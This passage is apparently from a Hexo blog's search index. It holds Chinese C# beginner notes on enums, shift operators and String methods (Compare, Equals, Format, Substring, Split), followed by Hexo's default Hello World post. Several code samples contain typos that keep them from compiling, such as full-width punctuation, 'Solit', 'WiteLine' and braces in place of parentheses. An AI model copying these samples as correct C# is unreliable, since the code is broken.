<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">	enum MyDate		&#x2F;&#x2F;使用enum创建枚举类型</span><br><span class="line">	&#123;</span><br><span class="line">		Sun &#x3D; 0,</span><br><span class="line">		Mon &#x3D; 1,</span><br><span class="line">		Tue &#x3D; 2,</span><br><span class="line">		Wed &#x3D; 3，</span><br><span class="line">		Thi &#x3D; 4,</span><br><span class="line">		Fri &#x3D; 5,</span><br><span class="line">		Sat &#x3D; 6</span><br><span class="line">	&#125;</span><br><span class="line">	static void Main (string[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		int k &#x3D; (int)DateTime.Now.DayOfWeek;		&#x2F;&#x2F;获取今天是星期几，并将获取的值强制转换成int类型</span><br><span class="line">		switch(k)</span><br><span class="line">		&#123;</span><br><span class="line">			case (int)MyDate.Sun: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期日“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Mon: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期一“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Tue: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期二“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Wed: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期三“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Thi: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期四“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Fri: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期五“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Sat: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期六“）；</span><br><span class="line">			break；</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		Console.ReadLine();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int(k) &#x3D; (int)DateTime.Now.DayOfWeek;		&#x2F;&#x2F;获取当前是星期几</span><br></pre></td></tr></table></figure>
<h1 id="字符操作"><a href="#字符操作" class="headerlink" title="字符操作"></a>字符操作</h1><h2 id="移位运算符（-gt-gt-amp-lt-lt-）"><a href="#移位运算符（-gt-gt-amp-lt-lt-）" class="headerlink" title="移位运算符（&gt;&gt;&amp;&lt;&lt;）"></a>移位运算符（&gt;&gt;&amp;&lt;&lt;）</h2><p>将数向指定的的方向移位，超出的位次会丢失，不足的则以0补充</p>
<ul>
<li>说明：<font size="1.5">在右移时,如果第一个操作数为int或uint (32位数),则移位数由第二个操作数的低5· 位给出;如果第一个操作数为long或ulong (64位数),则移位数由第二个操作数的低6位给出;如果第一个操作数为int或long,则右移位是算术移位(高序空位设置为符号位),如果第一个操作数为uint或ulong类型,则右移位是逻辑移位(高位填充0).</font></li>
</ul>
<h2 id="字符类Char的使用"><a href="#字符类Char的使用" class="headerlink" title="字符类Char的使用"></a>字符类Char的使用</h2><img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Char'suse1.png" class>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Char'suse2.png" class>



<p>Is开头的方法返回值为bool值（True or False）</p>
<h2 id="字符串类String的使用"><a href="#字符串类String的使用" class="headerlink" title="字符串类String的使用"></a>字符串类String的使用</h2><p>可通过Str[num]获取字符串中响应位置的单个字符，string 类型的字符串序号从0开始<br>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string Str1 &#x3D; “CosoleApp1”;</span><br><span class="line">char Cha1&#x3D; Str[0];		&#x2F;&#x2F;获取C</span><br><span class="line">char Cha2 &#x3D; Str[3]；		&#x2F;&#x2F;获取第二个o</span><br></pre></td></tr></table></figure>
<p>1、 Compare 方法</p>
<p>Compare方法用来比较两个字符串是否相等，它有很多的重载方法，其中最常见的两种方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Int Compare(string StrA,string StrB)		&#x2F;&#x2F;StrA和StrB代表要比较的两个字符串</span><br><span class="line">Int Compare(string StrA,string StrB,bool ignorCase)		&#x2F;&#x2F;ignorCase是一个布尔型变量，如果为true，那么在比较的时候就忽略大小写的差别。Compare方法是一个静态方法，所以在使用时可以直接使用</span><br></pre></td></tr></table></figure>
<p>2、 Equals 方法</p>
<p>Equals方法主要用于比较两个字符串是否相同，如果是则返回true，否则为false，常用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public bool Equals (string value)		&#x2F;&#x2F;value是要跟实例比较的字符串</span><br><span class="line">public static bool Equals (string a,string b)		&#x2F;&#x2F;a、b是两个要比较的字符串</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main (string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; &quot;我要开学&quot;；</span><br><span class="line">	string Str2 &#x3D; &quot;我要写作业&quot;；</span><br><span class="line">	Console.WriteLine (Str1.Equals(Str2));</span><br><span class="line">	Console.WriteLine (String.Equals(Str1,Str2));</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：<br>False<br>False</p>
<p>3、 Format方法（格式化字符串，用于将字符串格式化成为指定的格式）</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1&#x3D;”11”;</span><br><span class="line">	string Str2&#x3D;”22”;</span><br><span class="line">	string NewStr&#x3D;String.Format&#123;“&#123;0&#125;,&#123;1&#125;!!”,Str1,Str2&#125;;		&#x2F;&#x2F;格式化字符串（此处应注意的是定义字符类型时使用的是string，而调用方法时使用的是String类，S大写）</span><br><span class="line">	Console.WriteLine(NewStr);		&#x2F;&#x2F;输出结果为11,22！！</span><br><span class="line">	Console.ReadLine(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Date'sRule.png" class>

<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	DateTime dt &#x3D;DateTime.Now;		&#x2F;&#x2F;定义DateTime类型的变量，并获取当前的系统时间</span><br><span class="line">	string Str1 &#x3D; String.Format(“&#123;0:D&#125;”,dt);		&#x2F;&#x2F;将获取的系统时间格式化为YYYY年MM月dd日</span><br><span class="line">	Console.WiteLine(Str1)</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Format1.png" class> 

<p>如果不格式化（//string Str1 = String.Format(“{0:D}”,dt);）运行的结果为：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Format2.png" class> 

<p>4、 Substring(截取字符串)<br>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; “abcdef”;</span><br><span class="line">	string Str2 &#x3D; “”;		&#x2F;&#x2F;定义字符串，string类型的是引用类型，必须赋初值</span><br><span class="line">	Str2 &#x3D; Str1.Substring(1,4);		&#x2F;&#x2F;截取字符串，代表将Str1从第二位字符开始截取四位字符</span><br><span class="line">	Console.WriteLine(Str2);		&#x2F;&#x2F;输出结果将会是bcde</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>说明：<font size="1.5">在使用Substring方法截取字符串时，如果length参数的长度大于截取字符串的长度，将从起始位置的索引处截取之后的所有字符。</font></li>
</ul>
<p>5、 Split(分割字符串)</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; “ab^cd#e,fg”</span><br><span class="line">	char[] sep &#x3D; &#123;‘^’,’#’,’,’&#125;;		&#x2F;&#x2F;声明分隔字符的数组</span><br><span class="line">	String[] sepstring &#x3D; new String[100];		&#x2F;&#x2F;声明一个字符串数组</span><br><span class="line">	sepstring &#x3D; Str1.Solit(sep);		&#x2F;&#x2F;作分割处理</span><br><span class="line">	for (int i&#x3D;0;i&lt;sepstring.Length.i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(“item&#123;0&#125;:&#123;1&#125;”,I,sepstring[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/SplitRun1.png" class>

<p>Split会将所有被指定字符分隔的字符串全部分离，例如<br>string Str1 = “ab^c#d^ef,g”;若将源字符串这样赋值<br>char[] sep = { ‘^’, ‘#’, ‘,’ };分隔字符串不变<br>将输出：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/SplitRun2.png" class>


]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>C＃</category>
        <category>Game</category>
        <category>Code Language</category>
      </categories>
      <tags>
        <tag>C＃</tag>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hexo-test/uncategorized/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a>

<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
